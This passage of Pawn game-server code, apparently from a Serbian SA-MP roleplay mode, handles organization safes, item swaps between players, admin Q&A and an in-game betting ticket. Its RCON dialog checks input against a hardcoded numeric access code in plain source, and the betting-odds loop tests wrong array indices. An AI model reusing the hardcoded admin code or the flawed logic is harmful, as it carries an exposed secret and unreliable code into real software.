		    if( kolicina < 1 || kolicina > PlayerInfo[ playerid ][ xDrug ][ slot2 ] ) return SendErrorMessage( playerid, "Nemate toliko droge pod tim slotom!");
            if( kolicina > 1000 ) return SendErrorMessage( playerid, "Najvise u 1 slotu sefa moze stati 1000g droge." );
			if( OI[ OrgID ][ oSafeDrugCode ][ 0 ] != 0 && OI[ OrgID ][ oSafeDrugCode ][ 1 ] != 0 && OI[ OrgID ][ oSafeDrugCode ][ 2 ] != 0 && OI[ OrgID ][ oSafeDrugCode ][ 3 ] != 0 ) return SendErrorMessage( playerid, "Svih 4 slotova droge u sefu su zauzeti!");

            PlayerInfo[ playerid ][ xDrug ][ slot2 ] -= kolicina;
		    format( globalstring, sizeof( globalstring ), "* %s stavlja nesto u sef.", ImeIgraca( playerid ) );
			PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
		    SendClientMessageEx( playerid, ZUTA, "%s | Stavili ste %d grama %s u sef.", OI[ OrgID ][ oPreFix ], kolicina , GetDrugNameByDrugID( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) );

            if( OI[ OrgID ][ oSafeDrugCode ][ 0 ] == 0 ) {
			    OI[ OrgID ][ oSafeDrugCode ][ 0 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    OI[ OrgID ][ oSafeDrug ][ 0 ] = kolicina;
			}
			else if( OI[ OrgID ][ oSafeDrugCode ][ 1 ] == 0) {
			    OI[ OrgID ][ oSafeDrugCode ][ 1 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    OI[ OrgID ][ oSafeDrug ][ 1 ] = kolicina;
			}
			else if( OI[ OrgID ][ oSafeDrugCode ][ 2 ] == 0) {
			    OI[ OrgID ][ oSafeDrugCode ][ 2 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    OI[ OrgID ][ oSafeDrug ][ 2 ] = kolicina;
			}
			else if( OI[ OrgID ][ oSafeDrugCode ][ 3 ] == 0) {
			    OI[ OrgID ][ oSafeDrugCode ][ 3 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    OI[ OrgID ][ oSafeDrug ][ 3 ] = kolicina;
			}
			SaveOrganization( OrgID );

			if( PlayerInfo[ playerid ][ xDrug ][ slot2 ] <= 0 )
			    PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] = 0;
		}
	}
	else if( dialogid == dialog_ORGSAFEPMONEY ) {
		if( !response ) return true;
		if( response ) {
		    new novac, OrgID = PlayerInfo[ playerid ][ xClan ];
            if( sscanf( inputtext, "i", novac ) ) return SPD( playerid, dialog_ORGSAFEPMONEY, DSI, D_NASLOV,  "Unesite koliko novca zelite da ostavite.", D_ODABERI, D_ODUSTANI );
            if( novac < 1 || novac > 100000 ) return SPD( playerid, dialog_ORGSAFEPMONEY, DSI, D_NASLOV,  "GRESKA: Ne moze ispod 1 ili iznad 100000\nUnesite koliko novca zelite da ostavite.", D_ODABERI, D_ODUSTANI );
			if( novac > PlayerInfo[ playerid ][ xNovac ] ) return SPD( playerid, dialog_ORGSAFEPMONEY, DSI, D_NASLOV,  "GRESKA: Nemate toliko novca kod sebe\nUnesite koliko novca zelite da ostavite.", D_ODABERI, D_ODUSTANI );

			DajIgracuNovacSpeech( playerid, -novac );
            OI[ OrgID ][ oSafeMoney ] += novac;
			SaveOrganization( OrgID );

		    SendClientMessageEx( playerid, ZUTA, "%s | Ostavili ste %d$ u sef.", OI[ OrgID ][ oPreFix ], novac );

            new string[ 128 ]; 
            format( string, sizeof( string ), "Igrac %s je ostavio %d$ u sef orge %s", ImeIgraca( playerid ), novac, OI[OrgID][oName]);
            LogSave( "Ostalo/LogOrgSef.log", string );
		}
	}
	else if( dialogid == dialog_ORGSAFETMONEY ) {
		if( !response ) return true;
		if( response ) {
		    new novac, OrgID = PlayerInfo[ playerid ][ xClan ];
            if(PlayerInfo[playerid][xLider] != OrgID) return SendErrorMessage(playerid, "Samo lideri!");
            if( sscanf( inputtext, "i", novac ) ) return SPD( playerid, dialog_ORGSAFETMONEY, DSI, D_NASLOV,  "Unesite koliko novca zelite da uzmete iz sefa.", D_ODABERI, D_ODUSTANI );
            if( novac < 1 || novac > 100000 ) return SPD( playerid, dialog_ORGSAFETMONEY, DSI, D_NASLOV,  "GRESKA: Ne moze ispod 1 ili iznad 100000\nUnesite koliko novca zelite da uzmete iz sefa.", D_ODABERI, D_ODUSTANI );
			if( novac > OI[ OrgID ][ oSafeMoney ] ) return SPD( playerid, dialog_ORGSAFETMONEY, DSI, D_NASLOV,  "GRESKA: Nema toliko novca u sefu\nUnesite koliko novca zelite da uzmete iz sefa.", D_ODABERI, D_ODUSTANI );

			DajIgracuNovacSpeech( playerid, novac );
            OI[ OrgID ][ oSafeMoney ] -= novac;
			SaveOrganization( OrgID );

		    SendClientMessageEx( playerid, ZUTA, "%s | Uzeli ste %d$ iz sefa.", OI[ OrgID ][ oPreFix ], novac );

            new string[ 128 ]; 
            format( string, sizeof( string ), "Igrac %s je uzeo %d$ iz sefa orge %s", ImeIgraca( playerid ), novac, OI[OrgID][oName]);
            LogSave( "Ostalo/LogOrgSef.log", string );
		}
	}

    else if( dialogid == dialog_ORGSAFEPMATS ) {
        if( !response ) return true;
        if( response ) {
            new novac, OrgID = PlayerInfo[ playerid ][ xClan ];
            if( sscanf( inputtext, "i", novac ) ) return SPD( playerid, dialog_ORGSAFEPMATS, DSI, D_NASLOV,  "Unesite koliko materijala zelite da ostavite.", D_ODABERI, D_ODUSTANI );
            if( novac < 1 || novac > 100000 ) return SPD( playerid, dialog_ORGSAFEPMATS, DSI, D_NASLOV,  "GRESKA: Ne moze ispod 1 ili iznad 100000\nUnesite koliko materijala zelite da ostavite.", D_ODABERI, D_ODUSTANI );
            if( novac > PlayerInfo[ playerid ][ xMaterijali ] ) return SPD( playerid, dialog_ORGSAFEPMATS, DSI, D_NASLOV,  "GRESKA: Nemate toliko materijala kod sebe\nUnesite koliko materijala zelite da ostavite.", D_ODABERI, D_ODUSTANI );

            PlayerInfo[playerid][xMaterijali] -= novac;
            OI[ OrgID ][ oMaterijali ] += novac;
            SaveOrganization( OrgID );
            SavePlayer(playerid);

            SendClientMessageEx( playerid, ZUTA, "%s | Ostavili ste %d materijala u sef.", OI[ OrgID ][ oPreFix ], novac );

            new string[ 128 ]; 
            format( string, sizeof( string ), "Igrac %s je ostavio %d materijala u sef orge %s", ImeIgraca( playerid ), novac, OI[OrgID][oName]);
            LogSave( "Ostalo/LogOrgSef.log", string );
        }
    }
    else if( dialogid == dialog_ORGSAFETMATS ) {
        if( !response ) return true;
        if( response ) {
            new novac, OrgID = PlayerInfo[ playerid ][ xClan ];
            if(PlayerInfo[playerid][xLider] != OrgID) return SendErrorMessage(playerid, "Samo lideri!");
            if( sscanf( inputtext, "i", novac ) ) return SPD( playerid, dialog_ORGSAFETMATS, DSI, D_NASLOV,  "Unesite koliko materijala zelite da uzmete iz sefa.", D_ODABERI, D_ODUSTANI );
            if( novac < 1 || novac > 100000 ) return SPD( playerid, dialog_ORGSAFETMATS, DSI, D_NASLOV,  "GRESKA: Ne moze ispod 1 ili iznad 100000\nUnesite koliko materijala zelite da uzmete iz sefa.", D_ODABERI, D_ODUSTANI );
            if( novac > OI[ OrgID ][ oMaterijali ] ) return SPD( playerid, dialog_ORGSAFETMATS, DSI, D_NASLOV,  "GRESKA: Nema toliko materijala u sefu\nUnesite koliko materijala zelite da uzmete iz sefa.", D_ODABERI, D_ODUSTANI );

            PlayerInfo[playerid][xMaterijali] += novac;
            OI[ OrgID ][ oMaterijali ] -= novac;
            SaveOrganization( OrgID );
            SavePlayer(playerid);

            SendClientMessageEx( playerid, ZUTA, "%s | Uzeli ste %d materijala iz sefa.", OI[ OrgID ][ oPreFix ], novac );

            new string[ 128 ]; 
            format( string, sizeof( string ), "Igrac %s je uzeo %d materijala iz sefa orge %s", ImeIgraca( playerid ), novac, OI[OrgID][oName]);
            LogSave( "Ostalo/LogOrgSef.log", string );
        }
    }

	else if( dialogid == dialog_RCONPROVERA ) {
	
		if( !response ) return Kick( playerid );
		if( response ) {
		
		    new broj;
		    if( sscanf( inputtext, "i", broj ) ) return SPD( playerid, dialog_RCONPROVERA, DSP, D_NASLOV, "Da bi mogli da koristite RCON admina, morate da ukucate sigurnosni RCON kodn\nMolimo vas da kod unesete ispod!", D_ODABERI, D_ODUSTANI );
		    if( broj != 2019147852 ) return SPD( playerid, dialog_RCONPROVERA, DSP, D_NASLOV, "Da bi mogli da koristite RCON admina, morate da ukucate sigurnosni RCON kodn\nMolimo vas da kod unesete ispod!", D_ODABERI, D_ODUSTANI );
		    
		    SendInfoMessage( playerid, "Uspesno si se ulogovao kao RCON administrator!" );
		}
	}
	else if( dialogid == dialog_ASKLISTA ) {
		if( !response ) return true;
		if( response ) {
		    listitem++;
		    new string[ 256 ];
		    if( askqList[ listitem ][ askqSend ] == false ) return SendErrorMessage( playerid, "U ovom slotu nema pitanja." );
            
            IzabraniAskQ[ playerid ] = listitem;
            
			format( string, sizeof( string ), "Igrac %s je poslao pitanje.\n\nPitanje: %s", askqList[ listitem ][ askqOwner ], askqList[ listitem ][ askqQuestion ] );
		    
		    SPD( playerid, dialog_ASKLISTA_2, DSI, D_NASLOV, string, D_ODABERI, D_ODUSTANI );
		}
	}
	else if( dialogid == dialog_ASKLISTA_2 ) {
		if( !response ) return true;
		if( response ) {
			new text[ 128 ];
		    if( sscanf( inputtext, "s[128]", text ) ) return 1;
		    
			new askid = IzabraniAskQ[ playerid ];

		    if( askqList[ askid ][ askqSend ] == false ) return SendErrorMessage( playerid, "U ovom slotu nema pitanja." );

			askqList[ askid ][ askqSend ] = false;
			
			new id = askqList[ askid ][ askqID ];
			IzabraniAskQ[ playerid ] = -1;
			
			if( strcmp( ImeIgraca( id ), askqList[ askid ][ askqOwner ], true ) == 0 ) {

				askqInfo[ id ][ askqAnswered ] = true;
				strmid( askqInfo[ id ][ askqAdmin ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 32 );
	            strmid( askqInfo[ id ][ askqAnswer ], text, 0, strlen( text ), 128 );
	            
				format( globalstring, sizeof( globalstring ), "{5FD12E}|ASKQ ODGOVOR| %s (%d) -> %s (%d) : %s!.", ImeIgraca( playerid ), playerid, askqList[ askid ][ askqOwner ], id, text );
				RPTChat( SUPPORTER, globalstring );
	            
	            SendInfoMessage( playerid, "Poslali ste odgovor igracu %s.", askqList[ askid ][ askqOwner ] );
	            SendInfoMessage( playerid, "Vas odgovor glasi: %s.", text );

                new string[ 256 ];
                format( string, sizeof( string ), "Admin/Helper %s je odgovorio na tvoje pitanje.\n\nOdgovor: %s", askqInfo[ id ][ askqAdmin ], askqInfo[ id ][ askqAnswer ] );

                SPD( id, 0, DSMSG, D_NASLOV, string, "Potvrdi", "" );
                
                askqInfo[ id ][ askqSended ] = false;
                askqInfo[ id ][ askqAnswered ] = false;
                strmid( askqInfo[ id ][ askqAdmin ], "None", 0, strlen( "None" ), 32 );
                strmid( askqInfo[ id ][ askqAnswer ], "None", 0, strlen( "None" ), 128 );

                strmid( askqList[ askid ][ askqOwner ], "None", 0, strlen( "None" ), 32 );
                askqList[ askid ][ askqID ] = -1;
	            
	            // SendClientMessageEx( id, SRVBOJA1, "Admin/Helper je odgovorio na tvoje pitanje." );
	            // SendClientMessageEx( id, SRVBOJA1, "Da pogledate odgovor ukucajte "col_white"'/pogledajodgovor'." );
	            
			}
            else {
            
                if( id != IPI ) {
                
	                askqInfo[ id ][ askqSended ] = false;
	                askqInfo[ id ][ askqAnswered ] = false;
					strmid( askqInfo[ id ][ askqAdmin ], "None", 0, strlen( "None" ), 32 );
		            strmid( askqInfo[ id ][ askqAnswer ], "None", 0, strlen( "None" ), 128 );
                }
                
                strmid( askqList[ askid ][ askqOwner ], "None", 0, strlen( "None" ), 32 );
                askqList[ askid ][ askqID ] = -1;
				SendErrorMessage( playerid, "Taj igrac nije online." );
				return 1;
			}
		}
	}
	else if( dialogid == dialog_ZAMENA_2 ) {

        if( !response ) return 1;
		if( response ) {
		
		    new slot1, slot2, igrac = GlobalProdaja[ playerid ], ID_1 = GlobalID[ playerid ], ID_2 = GlobalID_2[ playerid ];
		    
		    strmid( VehicleInfo[ ID_1 ][ vOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 24);
		    strmid( VehicleInfo[ ID_2 ][ vOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 24);

			if( PlayerInfo[ igrac ][ xVoziloID ][ 0 ] == VehicleInfo[ ID_1 ][ vProvera ] ) slot1 = 1; 
		    else if( PlayerInfo[ igrac ][ xVoziloID ][ 1 ] == VehicleInfo[ ID_1 ][ vProvera ] ) slot1 = 2; 
		    else if( PlayerInfo[ igrac ][ xVoziloID ][ 2 ] == VehicleInfo[ ID_1 ][ vProvera ] ) slot1 = 3; 
		    else if( PlayerInfo[ igrac ][ xVoziloID ][ 3 ] == VehicleInfo[ ID_1 ][ vProvera ] ) slot1 = 4; 

            if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == VehicleInfo[ ID_2 ][ vProvera ] ) slot2 = 1;
		    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == VehicleInfo[ ID_2 ][ vProvera ] ) slot2 = 2;
		    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == VehicleInfo[ ID_2 ][ vProvera ] ) slot2 = 3;
		    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == VehicleInfo[ ID_2 ][ vProvera ] ) slot2 = 4;

			if( slot1 == 1 ) { PlayerInfo[ igrac ][ xVoziloID ][ 0 ] = ID_2; }
			else if( slot1 == 2 ) { PlayerInfo[ igrac ][ xVoziloID ][ 1 ] = ID_2; }
			else if( slot1 == 3 ) { PlayerInfo[ igrac ][ xVoziloID ][ 2 ] = ID_2; }
			else if( slot1 == 4 ) { PlayerInfo[ igrac ][ xVoziloID ][ 3 ] = ID_2; }
			
			if( slot2 == 1 ) { PlayerInfo[ playerid ][ xVoziloID ][ 0 ] = ID_1; }
			else if( slot2 == 2 ) { PlayerInfo[ playerid ][ xVoziloID ][ 1 ] = ID_1; }
			else if( slot2 == 3 ) { PlayerInfo[ playerid ][ xVoziloID ][ 2 ] = ID_1; }
			else if( slot2 == 4 ) { PlayerInfo[ playerid ][ xVoziloID ][ 3 ] = ID_1; }


		    new string1[ 128 ];
			format( string1, sizeof( string1 ), "ZamenaV | %s - %s(ID %d) -> %s - %s(ID %d)", ImeIgraca( igrac ), GetVehicleNameEx( VehicleInfo[ ID_1 ][ vModel ] ), ID_1, ImeIgraca( playerid ), GetVehicleNameEx( VehicleInfo[ ID_2 ][ vModel ] ), ID_2 );
			LogSave( "Ostalo/LogZamenaVozila.log", string1 );

			SavePlayer( playerid ); SavePlayer( igrac );
			SaveVehicle( ID_1 ); SaveVehicle( ID_2 );
		}
	}
	else if( dialogid == dialog_ZAMENA_4 ) {

        if( !response ) return 1;
		if( response ) {

		    new slot1, slot2, igrac = GlobalProdaja[ playerid ], ID_1 = GlobalID[ playerid ], ID_2 = GlobalID_2[ playerid ];

		    strmid( II[ ID_1 ][ iOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 24);
		    strmid( II[ ID_2 ][ iOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 24);

			if( PlayerInfo[ igrac ][ xProperty ][ 0 ] == II[ ID_1 ][ iVW ] ) { slot1 = 1; }
		    else if( PlayerInfo[ igrac ][ xProperty ][ 1 ] == II[ ID_1 ][ iVW ] ) { slot1 = 2; }
		    else if( PlayerInfo[ igrac ][ xProperty ][ 2 ] == II[ ID_1 ][ iVW ] ) { slot1 = 3; }

            if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == II[ ID_2 ][ iVW ] ) { slot2 = 1; }
		    else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == II[ ID_2 ][ iVW ] ) { slot2 = 2; }
		    else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == II[ ID_2 ][ iVW ] ) { slot2 = 3; }

			if( slot1 == 1 ) { PlayerInfo[ igrac ][ xProperty ][ 0 ] = ID_2; }
			else if( slot1 == 2 ) { PlayerInfo[ igrac ][ xProperty ][ 1 ] = ID_2; }
			else if( slot1 == 3 ) { PlayerInfo[ igrac ][ xProperty ][ 2 ] = ID_2; }

			if( slot2 == 1 ) { PlayerInfo[ playerid ][ xProperty ][ 0 ] = ID_1; }
			else if( slot2 == 2 ) { PlayerInfo[ playerid ][ xProperty ][ 1 ] = ID_1; }
			else if( slot2 == 3 ) { PlayerInfo[ playerid ][ xProperty ][ 2 ] = ID_1; }

		    new string1[ 128 ];
			format( string1, sizeof( string1 ), "ZamenaI | %s - ID %d -> %s - ID %d", ImeIgraca( igrac ), ID_1, ImeIgraca( playerid ), ID_2 );
			LogSave( "Ostalo/LogZamenaImovina.log", string1 );
			
			SavePlayer( playerid ); SavePlayer( igrac );
			SaveProperty( ID_1 ); SaveProperty( ID_2 );
		}
	}
	else if( dialogid == dialog_ZAMENA_3 ) {

        if( !response ) return 1;
		if( response ) {

		    new igrac = GlobalProdaja[ playerid ], ID_1 = PlayerInfo[ igrac ][ xFirmaID ], ID_2 = PlayerInfo[ playerid ][ xFirmaID ];

		    strmid( BussinesInfo[ ID_1 ][ bOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 24);
		    strmid( BussinesInfo[ ID_2 ][ bOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 24);

			PlayerInfo[ igrac ][ xFirmaID ] = ID_2;
			PlayerInfo[ playerid ][ xFirmaID ] = ID_1;

		    new string1[ 128 ];
			format( string1, sizeof( string1 ), "ZamenaF | %s - ID %d -> %s - ID %d", ImeIgraca( igrac ), ID_1, ImeIgraca( playerid ), ID_2 );
			LogSave( "Ostalo/LogZamenaFirmi.log", string1 );

			SavePlayer( playerid ); SavePlayer( igrac );
			SaveBussines( ID_1 ); SaveBussines( ID_2 );
		}
	}
	else if( dialogid == dialog_UPLATITIKET ) {
	
	    if( response ) {
	    
	        IzabraniPar[ playerid ] = listitem;
	        
	        new str[ 20 ];
	        
	        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

			format( str, sizeof( str ), "1 - %.2f\n", Parovi[ IzabraniPar[ playerid ] ][ Kvota ][ 0 ] );
			strcat( DialogStrgEx, str );
			format( str, sizeof( str ), "X - %.2f\n", Parovi[ IzabraniPar[ playerid ] ][ Kvota ][ 2 ] );
			strcat( DialogStrgEx, str );
			format( str, sizeof( str ), "2 - %.2f", Parovi[ IzabraniPar[ playerid ] ][ Kvota ][ 1 ] );
			strcat( DialogStrgEx, str );

	        SPD( playerid, dialog_UPLATITIKET_2, DSL, "Izaberi konacan ishod", DialogStrgEx, "Izaberi", "Odustani" );

            strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	    }
	    else if( !response ) {
	    
	        for(  new i = 0; i < 10; i++ ) {
			  	KladionicaListic[ playerid ][ parID ][ i ] = -1;
			  	KladionicaListic[ playerid ][ keciksdva ][ i ] = -1;
			  	KladionicaListic[ playerid ][ Kvota ][ i ] = 0.0;
			  	KladionicaListic[ playerid ][ teamID1 ][ i ] = -1;
				KladionicaListic[ playerid ][ teamID2 ][ i ] = -1;
			}
			KladionicaListic[ playerid ][ Uplaceno ] = false;
			KladionicaListic[ playerid ][ Zavrseno ] = false;
			KladionicaListic[ playerid ][ Uplata ] = 0;
		 	KladionicaListic[ playerid ][ Dobitak ] = 0;
		 	KladionicaListic[ playerid ][ Status ] = false;
		 	SaveKladionica( playerid );
			KladionicaTDControl( playerid, false );
	    }
	    
	}
	else if( dialogid == dialog_UPLATITIKET_2 ) {

	    if( response ) {
	    
	        for( new ic = 0; ic < 10; ic++ ) {
	        
	            if( IzabraniPar[ playerid ] == KladionicaListic[ playerid ][ parID ][ ic ] ) {
	            
	                new str[ 128 ];

				    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					strcat( DialogStrgEx, str );

				    for(  new i = 0; i < 10; i++ ) {

					    format( str, sizeof( str ), "%s vs %s\n", bettingInfo[ Parovi[ i ][ parID ][ 0 ] ][ teamName ], bettingInfo[ Parovi[ i ][ parID ][ 1 ] ][ teamName ] );

		                strcat( DialogStrgEx, str );
					}

			    	SPD( playerid, dialog_UPLATITIKET, DSL, "Izaberi par:", DialogStrgEx, "Izaberi", "Odustani" );
			    	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	            
	                SendErrorMessage( playerid, "Vec imate taj par na listicu." );
	                return true;
	            
	            }
	        }
	    
	        new izabraniID = -1;
	        for( new i = 0; i < 10; i++ ) {
	        
	        	if( KladionicaListic[ playerid ][ parID ][ i ] == -1 ) {

					izabraniID = i;
					break;

	       		}
	    	}
	        if( izabraniID == -1 ) {
	        
	            SPD( playerid, dialog_UPLATITIKET_4, DSI, "Uplata", "Unesite koliko novaca zelite da uplatite za tiket", "Unesi", "Odustani" );
				SendErrorMessage( playerid, "Vec imas odigranih 10 parova." );
				return 1;
			}
	        
	        switch( listitem ) {
	        
	            case 0: { 
	            
                    KladionicaListic[ playerid ][ parID ][ izabraniID ] = IzabraniPar[ playerid ];
                    KladionicaListic[ playerid ][ keciksdva ][ izabraniID ] = 1;
                    KladionicaListic[ playerid ][ Kvota ][ izabraniID ] = Parovi[ IzabraniPar[ playerid ] ][ Kvota ][ 0 ];
	            }
	            case 1: {
	            
	            	KladionicaListic[ playerid ][ parID ][ izabraniID ] = IzabraniPar[ playerid ];
                    KladionicaListic[ playerid ][ keciksdva ][ izabraniID ] = 2;
                    KladionicaListic[ playerid ][ Kvota ][ izabraniID ] = Parovi[ IzabraniPar[ playerid ] ][ Kvota ][ 2 ];
	            }
	            case 2: {
	            
	                KladionicaListic[ playerid ][ parID ][ izabraniID ] = IzabraniPar[ playerid ];
                    KladionicaListic[ playerid ][ keciksdva ][ izabraniID ] = 3;
                    KladionicaListic[ playerid ][ Kvota ][ izabraniID ] = Parovi[ IzabraniPar[ playerid ] ][ Kvota ][ 1 ];
	            }
	        }
	        KladionicaListic[ playerid ][ teamID1 ][ izabraniID ] = Parovi[ IzabraniPar[ playerid ] ][ parID ][ 0 ];
			KladionicaListic[ playerid ][ teamID2 ][ izabraniID ] = Parovi[ IzabraniPar[ playerid ] ][ parID ][ 1 ];
	    	
	    	SPD( playerid, dialog_UPLATITIKET_3, DSMSG, "Nastavak", "Da li zelite da odigrate jos neki par?", "Da", "Ne" );
	    }
	    else if( !response ) {
	    
         	for(  new i = 0; i < 10; i++ ) {
			  	KladionicaListic[ playerid ][ parID ][ i ] = -1;
			  	KladionicaListic[ playerid ][ keciksdva ][ i ] = -1;
			  	KladionicaListic[ playerid ][ Kvota ][ i ] = 0.0;
			  	KladionicaListic[ playerid ][ teamID1 ][ i ] = -1;
				KladionicaListic[ playerid ][ teamID2 ][ i ] = -1;
			}
			KladionicaListic[ playerid ][ Uplaceno ] = false;
			KladionicaListic[ playerid ][ Zavrseno ] = false;
			KladionicaListic[ playerid ][ Uplata ] = 0;
		 	KladionicaListic[ playerid ][ Dobitak ] = 0;
		 	KladionicaListic[ playerid ][ Status ] = false;
		 	SaveKladionica( playerid );
			KladionicaTDControl( playerid, false );
	    }

	}
	else if( dialogid == dialog_UPLATITIKET_3 ) {

		if( response ) {
		
		    new broj = 0;
		    for(  new i = 0; i < 10; i++ ) {

	        	if( KladionicaListic[ playerid ][ parID ][ i ] != -1 ) {

					broj++;
	       		}
	    	}
	    	if( broj == 10 ) {
	    	
	    	    SPD( playerid, dialog_UPLATITIKET_4, DSI, "Uplata", "Unesite koliko novaca zelite da uplatite za tiket", "Unesi", "Odustani" );
	    	
				SendErrorMessage( playerid, "Vec imate odigranih 10 parova." );
				return true;
			}
		
		    new str[ 128 ];

		    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			strcat( DialogStrgEx, str );

		    for(  new i = 0; i < 10; i++ ) {

			    format( str, sizeof( str ), "%s vs %s\n", bettingInfo[ Parovi[ i ][ parID ][ 0 ] ][ teamName ], bettingInfo[ Parovi[ i ][ parID ][ 1 ] ][ teamName ] );

                strcat( DialogStrgEx, str );
			}

	    	SPD( playerid, dialog_UPLATITIKET, DSL, "Izaberi par:", DialogStrgEx, "Izaberi", "Odustani" );
	    	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
		
		}
		else if( !response ) {
		
		    new broj = 0;
		    for(  new i = 0; i < 10; i++ ) {

	        	if( KladionicaListic[ playerid ][ parID ][ i ] != -1 ) {
	        	
					broj++;
	       		}
	    	}
	    	if( broj == 0 ) {
	    	
	    	    new str[ 128 ];

			    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				strcat( DialogStrgEx, str );

			    for(  new i = 0; i < 10; i++ ) {

				    format( str, sizeof( str ), "%s vs %s\n", bettingInfo[ Parovi[ i ][ parID ][ 0 ] ][ teamName ], bettingInfo[ Parovi[ i ][ parID ][ 1 ] ][ teamName ] );

	                strcat( DialogStrgEx, str );
				}

		    	SPD( playerid, dialog_UPLATITIKET, DSL, "Izaberi par:", DialogStrgEx, "Izaberi", "Odustani" );
		    	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	    	
				SendErrorMessage( playerid, "Nemate odigranu ni jednu tekmu." );
				return true;
			}
	    	
	    	SPD( playerid, dialog_UPLATITIKET_4, DSI, "Uplata", "Unesite koliko novaca zelite da uplatite za tiket", "Unesi", "Odustani" );
		}
	}
	else if( dialogid == dialog_UPLATITIKET_4 ) {

		if( response ) {
		
		    new novac, Float:kvota[ 10 ];
		    if( sscanf( inputtext, "i", novac ) ) return SPD( playerid, dialog_UPLATITIKET_4, DSI, "Uplata", "Unesite koliko novaca zelite da uplatite za tiket", "Unesi", "Odustani" );
		    if( novac < 20 || novac > 300 ) return SPD( playerid, dialog_UPLATITIKET_4, DSI, "Uplata", "Greska: samo od 20 do 200 dolara.\nUnesite koliko novaca zelite da uplatite za tiket", "Unesi", "Odustani" );
		    if( PlayerInfo[ playerid ][ xNovac ] < novac ) return SPD( playerid, dialog_UPLATITIKET_4, DSI, "Uplata", "Greska: nemate toliko novca.\nUnesite koliko novaca zelite da uplatite za tiket", "Unesi", "Odustani" );

            new hour, minute, second, day, year, month;
			getdate( year, month, day );
			gettimeEx( hour, minute, second );
			FixHour( hour );
			hour = shifthour;
			
			if( minute > 30 ) return SendErrorMessage( playerid, "Proslo je pola sata za uplate, ekajte sledece kolo." );

			DajIgracuNovac( playerid, -novac );
			BussinesMoney( uFirmi[ playerid ], novac/2 );

			SendInfoMessage( playerid, "Da vidis svoj tiket kucaj /mojlistic." );
		    
			KladionicaListic[ playerid ][ Uplata ] = novac;
			KladionicaListic[ playerid ][ Uplaceno ] = true;
			KladionicaListic[ playerid ][ Zavrseno ] = false;
			
			if( KladionicaListic[ playerid ][ Kvota ][ 0 ] == 0 ) { kvota[ 0 ] = 1; } else { kvota[ 0 ] = KladionicaListic[ playerid ][ Kvota ][ 0 ]; }
			if( KladionicaListic[ playerid ][ Kvota ][ 1 ] == 0 ) { kvota[ 1 ] = 1; } else { kvota[ 1 ] = KladionicaListic[ playerid ][ Kvota ][ 1 ]; }
			if( KladionicaListic[ playerid ][ Kvota ][ 2 ] == 0 ) { kvota[ 2 ] = 1; } else { kvota[ 2 ] = KladionicaListic[ playerid ][ Kvota ][ 2 ]; }
			if( KladionicaListic[ playerid ][ Kvota ][ 3 ] == 0 ) { kvota[ 3 ] = 1; } else { kvota[ 3 ] = KladionicaListic[ playerid ][ Kvota ][ 3 ]; }
			if( KladionicaListic[ playerid ][ Kvota ][ 4 ] == 0 ) { kvota[ 4 ] = 1; } else { kvota[ 4 ] = KladionicaListic[ playerid ][ Kvota ][ 4 ]; }
			if( KladionicaListic[ playerid ][ Kvota ][ 5 ] == 0 ) { kvota[ 5 ] = 1; } else { kvota[ 5 ] = KladionicaListic[ playerid ][ Kvota ][ 5 ]; }
			if( KladionicaListic[ playerid ][ Kvota ][ 6 ] == 0 ) { kvota[ 6 ] = 1; } else { kvota[ 6 ] = KladionicaListic[ playerid ][ Kvota ][ 6 ]; }
			if( KladionicaListic[ playerid ][ Kvota ][ 7 ] == 0 ) { kvota[ 7 ] = 1; } else { kvota[ 7 ] = KladionicaListic[ playerid ][ Kvota ][ 7 ]; }
			if( KladionicaListic[ playerid ][ Kvota ][ 7 ] == 0 ) { kvota[ 8 ] = 1; } else { kvota[ 8 ] = KladionicaListic[ playerid ][ Kvota ][ 8 ]; }
			if( KladionicaListic[ playerid ][ Kvota ][ 8 ] == 0 ) { kvota[ 9 ] = 1; } else { kvota[ 9 ] = KladionicaListic[ playerid ][ Kvota ][ 9 ]; }
			
			KladionicaListic[ playerid ][ Dobitak ] = novac*
													  kvota[ 0 ]*
													  kvota[ 1 ]*
													  kvota[ 2 ]*
													  kvota[ 3 ]*
													  kvota[ 4 ]*
													  kvota[ 5 ]*
													  kvota[ 6 ]*
													  kvota[ 7 ]*
													  kvota[ 8 ]*
													  kvota[ 9 ];
			SendInfoMessage( playerid, "Uspesno ste uplatili tiket. Dobitak %.2f.$", KladionicaListic[ playerid ][ Dobitak ] );
			
			

	        new staar[ 32 ];
			format( staar, sizeof( staar ), "%d.%d.%d %02d:30", day, month, year, hour );
	        strmid( KladionicaListic[ playerid ][ HourPobeda ], staar, 0, strlen( staar ), 32 );
			
			SaveKladionica( playerid );
			KladionicaTDControl( playerid, false );
		}
		else if( !response ) {
		
		    for(  new i = 0; i < 10; i++ ) {
			  	KladionicaListic[ playerid ][ parID ][ i ] = -1;
